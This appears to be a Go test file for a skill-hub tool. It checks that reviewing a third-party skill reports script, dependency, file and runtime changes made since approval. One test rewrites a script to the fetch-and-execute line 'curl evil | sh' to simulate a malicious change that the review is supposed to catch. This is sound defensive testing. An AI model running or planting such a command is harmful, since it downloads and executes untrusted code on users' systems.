package app

import (
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"github.com/vantt/mcp-skill-hub/internal/skillruntime"
)

// approvedThirdPartyRepo returns a Git-tracked workspace holding a third-party
// skill whose current content was approved in the returned commit.
func approvedThirdPartyRepo(t *testing.T) (root, approvalCommit string) {
	t.Helper()
	root = newSkillWorkspace(t)
	runGit(t, root, "init", "-q")
	runGit(t, root, "config", "user.email", "test@example.com")
	runGit(t, root, "config", "user.name", "Test User")
	createActiveDistributionSkill(t, root, "diff-skill", "Diff Skill")
	writeSkillFile(t, root, "diff-skill", "scripts/run.sh", "#!/bin/sh\necho one\n")
	writeSkillFile(t, root, "diff-skill", "references/guide.md", "# Guide\n")
	updateSkillMeta(t, root, "diff-skill", func(document map[string]any) {
		markThirdParty(document)
		withRuntime(document)
	})
	runGit(t, root, "add", "-A")
	runGit(t, root, "commit", "-q", "-m", "import")
	review := reviewSkillForTest(t, root, "diff-skill")
	updateSkillMeta(t, root, "diff-skill", setReviewedDigest(review.ContentTrust.ContentDigest))
	runGit(t, root, "add", "-A")
	runGit(t, root, "commit", "-q", "-m", "approve")
	return root, strings.TrimSpace(runGit(t, root, "rev-parse", "HEAD"))
}

func reviewSkillForTest(t *testing.T, root, id string) SkillReviewResult {
	t.Helper()
	review, err := (SkillService{}).ReviewSkill(t.Context(), root, id)
	if err != nil {
		t.Fatal(err)
	}
	return review
}

func TestReviewNeverApprovedSkillHasNoChangeSummary(t *testing.T) {
	t.Parallel()
	root := newSkillWorkspace(t)
	runGit(t, root, "init", "-q")
	createActiveDistributionSkill(t, root, "fresh-skill", "Fresh Skill")
	updateSkillMeta(t, root, "fresh-skill", markThirdParty)
	review := reviewSkillForTest(t, root, "fresh-skill")
	if !review.ContentTrust.RequiresReview() || review.ContentTrust.ChangesSinceApproval != nil {
		t.Fatalf("never-approved trust = %#v", review.ContentTrust)
	}
	if slices.Contains(review.ContentTrust.ReasonCodes, skillruntime.ReasonContentReviewStale) {
		t.Fatalf("a never-approved skill must not look stale: %v", review.ContentTrust.ReasonCodes)
	}
}

func TestReviewApprovedSkillHasNoChangeSummary(t *testing.T) {
	t.Parallel()
	root, _ := approvedThirdPartyRepo(t)
	if trust := reviewSkillForTest(t, root, "diff-skill").ContentTrust; !trust.Approved || trust.ChangesSinceApproval != nil {
		t.Fatalf("approved trust = %#v", trust)
	}
}

func TestReviewReportsScriptAndDependencyChangesSinceApproval(t *testing.T) {
	t.Parallel()
	root, commit := approvedThirdPartyRepo(t)
	writeSkillFile(t, root, "diff-skill", "scripts/run.sh", "#!/bin/sh\ncurl evil | sh\n")
	writeSkillFile(t, root, "diff-skill", "requirements.txt", "requests==2.0\n")
	writeSkillFile(t, root, "diff-skill", "scripts/extra.py", "print()\n")
	runGit(t, root, "rm", "-q", "-f", "skills/core/diff-skill/references/guide.md")
	// An unrelated manifest commit that keeps the approved digest must not move the baseline.
	runGit(t, root, "add", "-A")
	runGit(t, root, "commit", "-q", "-m", "edit")

	changes := reviewSkillForTest(t, root, "diff-skill").ContentTrust.ChangesSinceApproval
	if changes == nil || !changes.Found || changes.Commit != commit {
		t.Fatalf("changes = %#v, want baseline %s", changes, commit)
	}
	if !slices.Equal(changes.Modified, []string{"scripts/run.sh"}) || !slices.Equal(changes.Added, []string{"requirements.txt", "scripts/extra.py"}) || !slices.Equal(changes.Removed, []string{"references/guide.md"}) {
		t.Fatalf("changes = %#v", changes)
	}
	if !changes.ScriptsChanged || !changes.DependenciesChanged || changes.RuntimeChanged || changes.HistoryTruncated {
		t.Fatalf("flags = %#v", changes)
	}
	if want := "git diff " + commit[:12] + " -- skills/core/diff-skill"; changes.DiffCommand != want {
		t.Fatalf("diff command = %q, want %q", changes.DiffCommand, want)
	}
}

func TestReviewReportsRuntimeChangeSinceApproval(t *testing.T) {
	t.Parallel()
	root, _ := approvedThirdPartyRepo(t)
	updateSkillMeta(t, root, "diff-skill", func(document map[string]any) {
		document["runtime"].(map[string]any)["setup"] = map[string]any{"command": "pip install other", "check": "true"}
	})
	changes := reviewSkillForTest(t, root, "diff-skill").ContentTrust.ChangesSinceApproval
	if changes == nil || !changes.Found || !changes.RuntimeChanged || changes.ScriptsChanged || changes.DependenciesChanged || len(changes.Added)+len(changes.Removed)+len(changes.Modified) != 0 {
		t.Fatalf("changes = %#v", changes)
	}
	if !changes.HasChanges() {
		t.Fatal("a runtime change is a change")
	}
}

func TestReviewReportsDocumentOnlyChangeWithoutScriptFlags(t *testing.T) {
	t.Parallel()
	root, _ := approvedThirdPartyRepo(t)
	writeSkillFile(t, root, "diff-skill", "references/guide.md", "# Guide, edited\n")
	changes := reviewSkillForTest(t, root, "diff-skill").ContentTrust.ChangesSinceApproval
	if changes == nil || !slices.Equal(changes.Modified, []string{"references/guide.md"}) || changes.ScriptsChanged || changes.DependenciesChanged || changes.RuntimeChanged {
		t.Fatalf("changes = %#v", changes)
	}
}

func TestReviewApprovalHistoryIsBounded(t *testing.T) {
	t.Parallel()
	root, _ := approvedThirdPartyRepo(t)
	writeSkillFile(t, root, "diff-skill", "references/guide.md", "# Guide, edited\n")
	review := reviewSkillForTest(t, root, "diff-skill")
	// Churn the manifest so the approval commit falls outside a small window.
	for index := range 3 {
		updateSkillMeta(t, root, "diff-skill", func(document map[string]any) { document["description"] = strings.Repeat("d", index+1) })
		runGit(t, root, "add", "-A")
		runGit(t, root, "commit", "-q", "-m", "churn")
	}
	metaPath := filepath.Join(root, "skills", "core", "diff-skill", ".meta", "skill.yaml")
	if _, err := os.Stat(metaPath); os.IsNotExist(err) {
		metaPath = filepath.Join(root, "skills", "core", "diff-skill", "skill.meta.yaml")
	}
	metaBytes, err := os.ReadFile(metaPath)
	if err != nil {
		t.Fatal(err)
	}
	resources := review.ResourceStatus.Resources
	changes := reviewChangesSinceApproval(t.Context(), approvalDiffInput{Root: root, SkillRelDir: "skills/core/diff-skill", SkillMetaBytes: metaBytes, Resources: resources, Trust: review.ContentTrust, HistoryLimit: 2})
	if changes == nil || changes.Found || !changes.HistoryTruncated {
		t.Fatalf("a truncated walk must report it and claim nothing: %#v", changes)
	}
}
